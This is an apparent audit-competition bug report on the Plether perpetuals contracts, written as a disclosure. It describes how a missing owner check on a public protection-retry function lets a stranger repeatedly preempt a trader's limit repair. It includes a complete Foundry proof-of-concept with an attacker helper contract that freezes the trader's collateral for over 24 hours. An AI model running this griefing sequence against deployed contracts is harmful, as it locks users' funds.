# \#98001 [SC-High] Permissionless protection retries can preempt limit repair and freeze trader collateral

**Submitted on Nov 4th 2026 at 09:59:37 UTC by @Pig46940 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98001
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Temporary freezing of funds for at least 24 hours
  - Temporary freezing of funds for at least 1 hour

## Description

## Brief/Intro

When a position-protection close fails the trader's financial limit, the protection enters a state in which only that trading account may amend the limit. An unrelated caller can immediately retry the protection and replace that repair state with a new pending close. By repeatedly winning this ordering, the caller prevents the trader from closing the position and withdrawing its pledged USDG. 

## Vulnerability Details

The failed close correctly enforces the trader's limit. The flaw is the asymmetric access to the resulting repair state. The account owner may amend only while the protection is `Latched` and the account has no pending order. `retryPositionProtectionClose` is public and does not authenticate the caller as the protected account. It commits another child close and changes the protection to `Triggered`:

```solidity
// PositionProtectionBook.sol:315-326 (abbreviated)
StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
    revert OrderRouter__ProtectionNotLatched();
}
if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
    revert OrderRouter__PendingOrdersExist();
}

// PositionProtectionBook.sol:382-405, 564-574 (abbreviated)
StoredProtection storage protection = _activeProtection(protectionId);
// No account-owner check on the retry caller.
linkedOrderId = IPositionProtectionCloseAttemptHost(ROUTER)
    .commitProtectionCloseAttempt(protectionId, protection.account, protection.side, protection.size);
_recordCloseAttempt(protection, linkedOrderId);
protection.linkedOrderId = linkedOrderId;
protection.status = PositionProtectionTypes.PositionProtectionStatus.Triggered;
```

A terminal child returns to `Latched` if the original position still exists. The unrelated caller can combine public child expiry and public retry in one transaction, so no owner amendment can occur between them. When the child is eligible for execution, the caller can likewise execute a cap-failing child and retry in one transaction. The new child retains the old financial ceiling through `OrderLiquidationBatchLogic._protectionCloseRequest` (lines 657-680). The first adverse committed write is `_recordCloseAttempt` changing the protection back to `Triggered` under an unchanged limit.

## Impact Details

**Selected impact: High — Temporary freezing of funds for at least 24 hours.** The active protection prevents an ordinary close. The still-open position keeps its PnL pledge locked in Clearinghouse; withdrawing that pledge fails the free-equity check:

```solidity
// OrderLiquidationBatchLogic.sol:313-315
if (enforceProtectionLock && host.positionProtectionBook().activePositionProtectionId(account) != 0) {
    revert OrderRouter__ProtectionActive();
}

// MarginClearinghouse.sol:467-476 (abbreviated)
uint256 totalLockedMargin = _totalLockedMarginAssets(account);
if (remainingEquity < totalLockedMargin) {
    revert MarginClearinghouse__InsufficientFreeEquity();
}
IERC20(settlementAsset).safeTransfer(owner, amount);
```

These two guards are appropriate in isolation. Permissionless renewal keeps the prerequisite close from completing, so the owner's pledged funds remain inaccessible while the attacker maintains the pending child. The attacker need not receive USDG or control a protocol administrator. The runnable test below demonstrates a selected 24-hour-plus sequence and the same owner's successful close and physical withdrawal when the retry does not preempt repair.

## References

- [PositionProtectionBook.sol at the frozen commit](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol)
- [OrderLiquidationBatchLogic.sol at the frozen commit](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol)
- [MarginClearinghouse.sol at the frozen commit](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol)


## Proof of Concept

## Proof of Concept

```Solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Copy this one file beside the pinned repository's PositionProtection.t.sol.
// Run only test_PublicRetriesDelayAnActiveTraderExitForTwentyFourHours.
import {PositionProtectionTest} from "./PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";

interface IPublicOrderExpiry {
    function expireOrder(uint64 orderId) external returns (OrderV3Types.ExecutionResult memory);
}

/// @notice One ordinary attacker transaction, using only public entrypoints.
contract PublicExpiryAndRetry {
    IPublicOrderExpiry public immutable orderRouter;
    IPositionProtectionActions public immutable protectionBook;

    constructor(address routerAddress, address protectionBookAddress) {
        orderRouter = IPublicOrderExpiry(routerAddress);
        protectionBook = IPositionProtectionActions(protectionBookAddress);
    }

    function expireThenRetry(uint64 expiredOrderId, uint64 protectionId)
        external
        returns (uint64 replacementOrderId)
    {
        OrderV3Types.ExecutionResult memory expiredOrder = orderRouter.expireOrder(expiredOrderId);
        require(
            expiredOrder.status == OrderV3Types.LifecycleStatus.Failed
                && expiredOrder.terminalReason == OrderV3Types.TerminalReason.Expired,
            "protection child was not expired"
        );
        replacementOrderId = protectionBook.retryPositionProtectionClose(protectionId);
    }
}

contract ProtectionRetryMinimalPoCTest is PositionProtectionTest {
    function test_PublicRetriesDelayAnActiveTraderExitForTwentyFourHours() public {
        _startRecordingLogs();

        // Alice is a directly funded trading EOA in this fixture. Open her
        // position through the public commit and execute order entrypoints.
        // The production deployment also supports SimpleAccount traders;
        // this test does not model an owner-authenticated account batch.
        OrderV3Types.OrderRequest memory initialOpenRequest =
            _boundedOpenRequest(CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, 0);
        vm.prank(ALICE);
        uint64 initialOpenOrderId = router.commitOrder(initialOpenRequest);
        bytes[] memory initialOpenPriceUpdate = _mockPythUpdateData(MARK_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory initialOpenExecution =
            router.executeOrder(initialOpenOrderId, initialOpenPriceUpdate);
        assertEq(
            uint8(initialOpenExecution.status), uint8(OrderV3Types.LifecycleStatus.Executed)
        );
        (uint256 openedPositionSize,,,,,,) = engine.positions(ALICE);
        assertEq(openedPositionSize, POSITION_SIZE);
        // Public opening advanced the Engine mark beyond the last stored
        // oracle basket. Publish a fresh mark before arming protection.
        _refreshMark(MARK_PRICE);
        uint256 protectionTriggerPrice = MARK_PRICE - 1;
        uint256 priceThatViolatesTheOldLimit = MARK_PRICE + 10_000;
        PositionProtectionTypes.PositionProtectionParams memory protectionSettings =
            _params(protectionTriggerPrice, 0);
        protectionSettings.closeLimits.maxExecutionNotionalAssets = 10_000_500_000;
        PositionProtectionTypes.CloseFinancialLimits memory repairedLimits =
            PositionProtectionTypes.CloseFinancialLimits({
                maxExecutionNotionalAssets: 25_000e6,
                maxGrossAccountDebitAssets: 25_000e6,
                maxActionChargeAssets: 25_000e6,
                maxExplicitFeesAssets: 25_000e6
            });
        assertEq((POSITION_SIZE * MARK_PRICE) / 1e20, 10_000e6);
        assertEq((POSITION_SIZE * priceThatViolatesTheOldLimit) / 1e20, 10_001e6);

        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(protectionSettings);
        uint64 initialCloseOrderId = _triggerAt(protectionId, protectionTriggerPrice);
        bytes[] memory firstExecutionUpdate = _mockPythUpdateData(priceThatViolatesTheOldLimit);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory firstClose =
            router.executeOrder(initialCloseOrderId, firstExecutionUpdate);
        assertEq(uint8(firstClose.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(
            uint8(firstClose.terminalReason),
            uint8(OrderV3Types.TerminalReason.ConstraintViolation)
        );
        OrderV3Types.CompactOutcome memory firstReceipt = _verifiedOutcome(
            IOrderLifecycleBook(address(router.lifecycleBook())), initialCloseOrderId
        );
        assertEq(
            uint8(firstReceipt.failedConstraint),
            uint8(OrderV3Types.ConstraintKind.ExecutionNotional)
        );
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched)
        );

        // Remove money already free to withdraw. The remaining 1,986 USDG
        // belongs to the live position and can be released only after close.
        uint256 initiallyFreeAssets =
            clearinghouse.getAccountAssetBuckets(ALICE).freeSettlementAssets;
        vm.prank(ALICE);
        clearinghouse.withdrawMargin(initiallyFreeAssets);
        assertEq(clearinghouse.getAccountAssetBuckets(ALICE).freeSettlementAssets, 0);
        assertEq(clearinghouse.getPnlIsolationBuckets(ALICE).pnlPledgeAssets, 1_986e6);

        uint256 commonFinancialState = vm.snapshotState();
        uint256 attackStartTime = vm.getBlockTimestamp();
        uint256 aliceWalletBeforeAttack = settlementToken.balanceOf(ALICE);
        uint256 clearinghouseCashBeforeAttack = settlementToken.balanceOf(address(clearinghouse));
        uint256 poolCashBeforeAttack = settlementToken.balanceOf(address(pool));

        PublicExpiryAndRetry carolPublicHelper =
            new PublicExpiryAndRetry(address(router), address(protectionActions));
        vm.prank(CAROL);
        uint64 pendingCloseOrderId = protectionActions.retryPositionProtectionClose(protectionId);

        // Every expiry and retry is one ordinary Carol transaction. Three
        // selected Alice attempts show that she tries to clear a live child;
        // Carol wins the subsequent, separate amendment transaction.
        uint256 ownerAttemptsPreempted;
        for (uint256 renewalNumber; renewalNumber < 1417; ++renewalNumber) {
            uint256 currentDeadline =
                router.lifecycleBook().orderTiming(pendingCloseOrderId).executionDeadline;
            vm.warp(currentDeadline + 1);
            vm.roll(vm.getBlockNumber() + 1);
            vm.prank(CAROL);
            uint64 replacementOrderId =
                carolPublicHelper.expireThenRetry(pendingCloseOrderId, protectionId);
            assertGt(replacementOrderId, pendingCloseOrderId);
            pendingCloseOrderId = replacementOrderId;

            if (renewalNumber == 0 || renewalNumber == 708 || renewalNumber == 1416) {
                vm.warp(vm.getBlockTimestamp() + 1);
                vm.roll(vm.getBlockNumber() + 1);
                bytes[] memory ownerExecutionUpdate =
                    _mockPythUpdateData(priceThatViolatesTheOldLimit);
                vm.prank(ALICE);
                OrderV3Types.ExecutionResult memory ownerExecution =
                    router.executeOrder(pendingCloseOrderId, ownerExecutionUpdate);
                assertEq(uint8(ownerExecution.status), uint8(OrderV3Types.LifecycleStatus.Failed));
                assertEq(
                    uint8(ownerExecution.terminalReason),
                    uint8(OrderV3Types.TerminalReason.ConstraintViolation)
                );
                assertEq(
                    uint8(protectionViews.getPositionProtection(protectionId).status),
                    uint8(PositionProtectionTypes.PositionProtectionStatus.Latched)
                );
                vm.prank(CAROL);
                pendingCloseOrderId =
                    protectionActions.retryPositionProtectionClose(protectionId);
                vm.prank(ALICE);
                vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
                protectionActions.amendLatchedPositionProtectionCloseLimits(
                    protectionId, repairedLimits
                );
                ++ownerAttemptsPreempted;
            }

            // A fresh equal-price mark keeps the market usable during the
            // long local schedule; it creates no trader cash transfer.
            if ((renewalNumber + 1) % 60 == 0) {
                _refreshMark(priceThatViolatesTheOldLimit);
            }
        }

        uint256 attackEndTime = vm.getBlockTimestamp();
        assertEq(ownerAttemptsPreempted, 3);
        // Each selected owner attempt advances one second explicitly and
        // another second when its mock Pyth update is prepared.
        assertEq(attackEndTime - attackStartTime, 1417 * 61 + 2 * ownerAttemptsPreempted);
        assertGt(attackEndTime - attackStartTime, 1 days);
        assertEq(clearinghouse.getPnlIsolationBuckets(ALICE).pnlPledgeAssets, 1_986e6);
        assertEq(clearinghouse.getAccountAssetBuckets(ALICE).freeSettlementAssets, 0);
        assertEq(settlementToken.balanceOf(ALICE), aliceWalletBeforeAttack);
        assertEq(settlementToken.balanceOf(address(clearinghouse)), clearinghouseCashBeforeAttack);
        assertEq(settlementToken.balanceOf(address(pool)), poolCashBeforeAttack);
        (uint256 remainingPositionSize,,,,,,) = engine.positions(ALICE);
        assertEq(remainingPositionSize, POSITION_SIZE);
        vm.prank(ALICE);
        vm.expectRevert(MarginClearinghouse.MarginClearinghouse__InsufficientFreeEquity.selector);
        clearinghouse.withdrawMargin(1_986e6);

        emit log_named_uint("simulated attacker-first seconds", attackEndTime - attackStartTime);
        emit log_named_uint("active Alice recovery attempts preempted", ownerAttemptsPreempted);
        emit log_named_uint("attack branch Alice wallet USDG atoms", aliceWalletBeforeAttack);
        emit log_named_uint("attack branch Alice pledge USDG atoms", 1_986e6);
        emit log_named_uint("attack branch Clearinghouse USDG atoms", clearinghouseCashBeforeAttack);
        emit log_named_uint("attack branch Pool USDG atoms", poolCashBeforeAttack);

        // Same initial financial state and same final time, without Carol's
        // attacker-first preemption: Alice repairs and receives her pledge.
        assertTrue(vm.revertToState(commonFinancialState));
        vm.warp(attackEndTime);
        vm.roll(vm.getBlockNumber() + 1);
        _refreshMark(priceThatViolatesTheOldLimit);
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, repairedLimits);
        vm.prank(CAROL);
        uint64 repairedCloseOrderId = protectionActions.retryPositionProtectionClose(protectionId);
        bytes[] memory repairedExecutionUpdate =
            _mockPythUpdateData(priceThatViolatesTheOldLimit);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory successfulClose =
            router.executeOrder(repairedCloseOrderId, repairedExecutionUpdate);
        assertEq(uint8(successfulClose.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        (remainingPositionSize,,,,,,) = engine.positions(ALICE);
        assertEq(remainingPositionSize, 0);
        uint256 walletBeforePledgeRelease = settlementToken.balanceOf(ALICE);
        vm.prank(ALICE);
        clearinghouse.withdrawMargin(1_986e6);
        assertEq(settlementToken.balanceOf(ALICE), walletBeforePledgeRelease + 1_986e6);

        emit log_named_uint("owner control Alice wallet USDG atoms", settlementToken.balanceOf(ALICE));
        emit log_named_uint(
            "owner control Clearinghouse USDG atoms",
            settlementToken.balanceOf(address(clearinghouse))
        );
        emit log_named_uint("owner control Pool USDG atoms", settlementToken.balanceOf(address(pool)));
        emit log_named_uint("owner control pledge withdrawn USDG atoms", 1_986e6);
    }
}
```

The Solidity block above contains the complete PoC source. **No separate PoC attachment or externally supplied test file is required.**

Using the pinned repository, create the following file:

```text
packages/perps/test/perps/spec/trader/ProtectionRetryMinimalPoC.t.sol
```

and paste the Solidity source above into it without modification.

From the repository root, run:

```bash
cd packages/perps
forge test -j 2 --match-path test/perps/spec/trader/ProtectionRetryMinimalPoC.t.sol --match-test test_PublicRetriesDelayAnActiveTraderExitForTwentyFourHours --block-gas-limit 2500000000 -vv
```

The test opens Alice's position through public Router commit and execution, creates a protection with a 10,000.500000 USDG maximum execution notional, and makes its child fail that limit at 10,001.000000 USDG. Carol, who neither owns Alice's account nor has a privileged role, renews expired children by atomically calling public expiry and retry. Alice executes a child and tries to amend at three points; Carol's intervening retry makes each amendment revert. After 1,417 renewals and **86,443 simulated seconds**, Alice's 1,986.000000 USDG position pledge is still locked and her withdrawal reverts. A control from the same financial prestate lets Alice amend, close, and withdraw **1,986.000000 USDG**.

| Physical USDG or entitlement | Attacker-first branch | Owner-repair control |
| --- | ---: | ---: |
| Alice wallet | 17,999.600000 | 19,985.600000 |
| Alice position pledge | 1,986.000000 locked | 0 after withdrawal |
| Clearinghouse cash | 42,000.400000 | 40,013.391323 |
| Pool cash | 1,002,000.000000 | 1,002,001.008677 |

The selected Foundry test passed: **1 passed, 0 failed**, exit status 0. It used Solidity 0.8.35 via IR and local Forge 1.6.0-v1.7.0. The `--block-gas-limit` option raises the aggregate local test frame; it is not the gas cost of one attack transaction.


